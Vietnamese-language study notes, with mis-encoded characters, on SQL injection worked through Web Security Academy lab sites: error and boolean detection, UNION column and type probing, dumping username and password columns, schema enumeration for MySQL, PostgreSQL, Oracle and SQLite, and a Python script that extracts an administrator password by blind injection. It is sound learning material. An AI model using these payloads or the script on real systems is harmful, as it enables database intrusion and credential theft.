Test 1: https://shop.com/product.php?id=8'
‚Üí Error: You have an error in your SQL syntax near ''' 

Test 2: https://shop.com/product.php?id=8' AND 1=1-- -
‚Üí Hi·ªÉn th·ªã s·∫£n ph·∫©m b√¨nh th∆∞·ªùng

Test 3: https://shop.com/product.php?id=8' AND 1=2-- -
‚Üí Kh√¥ng hi·ªÉn th·ªã g√¨ (blank page)
‚úÖ K·∫øt lu·∫≠n: C√≥ SQL Injection

üß± PH∆Ø∆†NG PH√ÅP 1: ORDER BY (Ph∆∞∆°ng ph√°p ƒë·∫øm b·∫±ng s·∫Øp x·∫øp)
√ù t∆∞·ªüng g·ªëc
ORDER BY n = y√™u c·∫ßu database s·∫Øp x·∫øp theo c·ªôt th·ª© n
N·∫øu c·ªôt th·ª© n kh√¥ng t·ªìn t·∫°i, database s·∫Ω b√°o l·ªói.

B·∫°n th·ª≠ tƒÉng d·∫ßn:

ORDER BY 1   ‚Üí OK
ORDER BY 2   ‚Üí OK
ORDER BY 3   ‚Üí l·ªói
‚Üí nghƒ©a l√† ch·ªâ c√≥ 2 c·ªôt

üß± PH∆Ø∆†NG PH√ÅP 2: UNION SELECT NULL,... (Ph∆∞∆°ng ph√°p gh√©p d√≤ng)
UNION = n·ªëi th√™m h√†ng (row) t·ª´ m·ªôt c√¢u SELECT kh√°c v√†o b√™n d∆∞·ªõi k·∫øt qu·∫£.
V√≠ d·ª•:
SELECT id, name, score FROM Students
UNION
SELECT 999, 'Test', 0;
K·∫øt qu·∫£ s·∫Ω l√†:
id	name	score
1	An	9.0
2	B√¨nh	8.5
3	Chi	7.0
999	Test	0

Quan tr·ªçng: UNION ch·ªâ ho·∫°t ƒë·ªông n·∫øu hai SELECT c√≥ c√πng s·ªë c·ªôt.
Gi·ªù t∆∞·ªüng t∆∞·ª£ng: B·∫°n kh√¥ng bi·∫øt c√¢u SELECT g·ªëc tr·∫£ v·ªÅ bao nhi√™u c·ªôt. Nh∆∞ng b·∫°n mu·ªën vi·∫øt m·ªôt c√¢u UNION kh·ªõp s·ªë c·ªôt v·ªõi n√≥.
V√¨ b·∫°n ch∆∞a bi·∫øt ki·ªÉu d·ªØ li·ªáu t·ª´ng c·ªôt (s·ªë, ch·ªØ, ng√†y th√°ng,‚Ä¶), n√™n: d√πng gi√° tr·ªã c·ª• th·ªÉ (v√≠ d·ª• 123, 'ABC') s·∫Ω r·∫•t d·ªÖ sai ki·ªÉu.
C√≤n NULL th√¨: l√† ‚Äútr·ªëng‚Äù ‚Üí database th·∫•y ·ªïn trong h·∫ßu h·∫øt ki·ªÉu c·ªôt.
üëâ ƒê√≥ l√† l√Ω do d√πng:
UNION SELECT NULL
UNION SELECT NULL, NULL
UNION SELECT NULL, NULL, NULL
...
EXAMPLE
https://0a2c009903bfc9a780a31c86004b004e.web-security-academy.net/filter category=Accessories
Gi·∫£ s·ª≠ truy v·∫•n g·ªëc trong DB:
SELECT name, price FROM products WHERE category = 'Accessories' AND released = 1
ta ch√®n ' UNION SELECT NULL-- sau Accessories trong URL s·∫Ω th√†nh:
SELECT name, price FROM products WHERE category = 'Accessories' UNION SELECT NULL-- -' AND released = 1

sau khi x√°c ƒë·ªãnh ƒë∆∞·ª£c s·ªë c·ªôt theo c√°ch b√™n tr√™n, ta c·∫ßn x√°c ƒë·ªãnh ki·ªÉu d·ªØ li·ªáu, v√¨ khi d√πng UNION SELECT th√¨ theo sau ph·∫£i l√† c√°c
c·ªôt ch·ª©a ki·ªÉu d·ªØ li·ªáu kh·ªõp v·ªõi truy v·∫•n tr∆∞·ªõc ƒë√≥ n√™n ta c≈©ng th·ª≠ c√°c tr∆∞·ªùng h·ª£p d∆∞·ªõi ƒë√¢y(gi·∫£ s·ª≠ ƒë√£ t√¨m ra ƒë∆∞·ª£c r·∫±ng c√≥ 4 c·ªôt):
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
n·∫øu b√°o l·ªói th√¨ th·ª≠ ti·∫øp khi kh√¥ng l·ªói n·ªØa th√¨ oke.

sau khi th·ª±c hi·ªán ƒë∆∞·ª£c c√°c b∆∞·ªõc tr√™n l√† bi·∫øt s·ªë c·ªôt -> ki·ªÉu d·ªØ li·ªáu t·ª´ng c·ªôt th√¨ sau ƒë√≥ ta c√≥ th·ªÉ truy v·∫•n c√°c th√¥ng tin th√∫ v·ªã 
m√† ta c·∫ßn v√≠ d·ª•:
.../filter?category=Gifts' union select username, password from users-- -
·ªü ƒë√¢y ta ƒë√£ bi·∫øt tr∆∞·ªõc ƒë∆∞·ª£c l√† The database contains a different table called users, with columns called username and password.

v·∫•n ƒë·ªÅ ti·∫øp theo, v√≠ d·ª• truy v·∫•n ƒë·∫ßu ti√™n c√≥ hai c·ªôt v·ªõi d·ªØ li·ªáu l√† s·ªë v√† string, m√† d·ªØ li·ªáu ta c·∫ßn l·∫•y l√† username v√† passwd ch·ªâ
c√≥ ki·ªÉu string th√¥i th√¨ ph·∫£i l√†m sao? ƒë√°p √°n l√† ta n√™n truy v·∫•n v·ªõi tham s·ªë ƒë·∫ßu v·∫´n l√† ki·ªÉu s·ªë (ƒë·ªÉ null c≈©ng ƒë∆∞·ª£c) v√† username v√† 
passwd ta g·ªôp l·∫°i th√†nh m·ªôt tham s·ªë v·ªõi ki·ªÉu string b·∫±ng c√°ch sau ƒë√¢y:
.../filter?category=Accessories' union select null, username || '~' || password FROM users-- -
k·∫øt qu·∫£ l√† username v√† passwd ƒë∆∞·ª£c g·ªôp th√†nh m·ªôt c·ªôt nh∆∞ sau ƒë√¢y:
wiener~sd3owh795lps65mpfso7
Giant Pillow Thing
administrator~2ptqk3jbmma3ogglyjp4
carlos~sagxavnidrd2oawyo7mz


Querying the database type and version
Database          | type	Query
                  | SELECT sqlite_version()
Microsoft, MySQL  | SELECT @@version
Oracle	          | SELECT * FROM v$version
PostgreSQL	      | SELECT version()
For example, use a UNION attack with the following input: ' UNION SELECT @@version--
!!!!!!!!!! ƒë√¥i khi c·∫ßn th√™m kho·∫£ng tr·∫Øng ·ªü cu·ªëi (sau d·∫•u --) c√≥ l·∫Ω ƒë·ªëi v·ªõi csdl MySQL !!!!! 
ƒë·ªÉ x√°c ƒë·ªãnh ƒë∆∞·ª£c ki·ªÉu database type v√† version th√¨ ta c≈©ng c·∫ßn ph·∫£i l√†m c√°c b∆∞·ªõc tr∆∞·ªõc, x√°c ƒë·ªãnh s·ªë c·ªôt c·ªßa csdl, ki·ªÉu dl c·ªßa t·ª´ng
c·ªôt, sau ƒë√≥ truy v·∫•n nh∆∞ b√¨nh th∆∞·ªùng, truy v·∫•n cho csdl s·∫Ω chi·∫øm 1 c·ªôt:
.../filter?category=Pets' union select @@version, 'b'-- -
.../filter?category=Pets' union select @@version, @@version-- -


Listing the contents of the database
MySQL/PostgreSQL
to list the tables in the database: ' UNION SELECT * FROM information_schema.tables / ' UNION SELECT table_name, NULL FROM information_schema.tables--
to list the columns in individual tables: ' UNION SELECT * FROM information_schema.columns WHERE table_name = 'Users'
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
to retrieve the usernames and passwords for all users:
' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
graph TD
    A[B·∫Øt ƒë·∫ßu] --> B{C√≥ bi·∫øt t√™n b·∫£ng?};
    B -->|Kh√¥ng| C[D√πng information_schema.tables];
    B -->|C√≥| D{C√≥ bi·∫øt t√™n c·ªôt?};
    D -->|Kh√¥ng| E[D√πng information_schema.columns];
    D -->|C√≥| F[Truy v·∫•n TR·ª∞C TI·∫æP b·∫£ng ƒë√≠ch];
    C --> G[T√¨m ƒë∆∞·ª£c t√™n b·∫£ng];
    E --> H[T√¨m ƒë∆∞·ª£c t√™n c·ªôt];
    G --> D;
    H --> F;
SQLite 
-- Li·ªát k√™ tables
SELECT name FROM sqlite_master WHERE type='table'
-- Li·ªát k√™ columns (c√°ch 1)
SELECT sql FROM sqlite_master WHERE type='table' AND name='users'
for example: ' UNION SELECT 1, name, sql, 4 FROM sqlite_master WHERE type='table'--
Ho·∫∑c ƒë∆°n gi·∫£n h∆°n:
' UNION SELECT 1, name, type, 4 FROM sqlite_master--
sau ƒë√≥: ' UNION SELECT 1, FLAG, 'Flag Found', 4 FROM S3CRET--

BLIND SQLi
SQLi m√π, ch·ªâ hi·ªán nh·ªØng th·ª© nh∆∞ bt ho·∫∑c kh√¥ng, kh√¥ng hi·ªán l·ªói, c·∫ßn ƒëo√°n nh∆∞ ki·ªÉu c√≥ c√°i n√†y ho·∫∑c kh√¥ng
khi ƒë√£ bi·∫øt ƒë∆∞·ª£c l√† "The database contains a different table called users, with columns called username and password"
B1: x√°c ƒë·ªãnh c√≥ sql hay kh√¥ng 
‚Ä¶xyz' AND '1'='1 : hi·ªÉn th·ªã bt
‚Ä¶xyz' AND '1'='2 : kh√¥ng hi·ªÉn th·ªã m·ªôt ƒëi·ªÅu g√¨ ƒë√≥ v√≠ d·ª• d√≤ng ch·ªØ "Welcome back"
B2: X√°c ƒë·ªãnh ƒë·ªô d√†i password: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND 
(SELECT LENGTH(password) FROM users WHERE username='administrator') > 20--
B4: X√°c ƒë·ªãnh mk nh∆∞ ki·ªÉu bruteforce:
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
CODE:
import requests
import string
import time

URL = "https://0af90056042ea25481793eea00c6002d.web-security-academy.net/"
TRACKING_ID = "uAiwO5Lqbnc6h7UB"
SESSION = "34NVyY78SB28EqaEt2DtyFwFW4Y2pHMb"

def check_response(payload):
    """G·ª≠i request v√† ki·ªÉm tra response"""
    cookies = {'TrackingId': payload, 'session': SESSION}
    try:
        r = requests.get(URL, cookies=cookies, timeout=5)
        return "Welcome back" in r.text
    except:
        return False

def main():
    print("ƒêang t√¨m password...")
    
    # T√¨m ƒë·ªô d√†i
    print("1. T√¨m ƒë·ªô d√†i password...")
    for length in range(1, 51):
        payload = f"{TRACKING_ID}' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')={length}--"
        if check_response(payload):
            print(f"   ƒê·ªô d√†i: {length}")
            pw_length = length
            break
    
    # T√¨m t·ª´ng k√Ω t·ª±
    print("\n2. T√¨m t·ª´ng k√Ω t·ª±...")
    password = ""
    chars = string.ascii_lowercase + string.digits
    
    for pos in range(1, pw_length + 1):
        for char in chars:
            payload = f"{TRACKING_ID}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {pos}, 1)='{char}'--"
            
            if check_response(payload):
                password += char
                print(f"   V·ªã tr√≠ {pos:2d}: {char} ‚Üí {password}")
                break
        
        time.sleep(0.2)
    
    print(f"\nPassword: {password}")

if __name__ == "__main__":
    main()





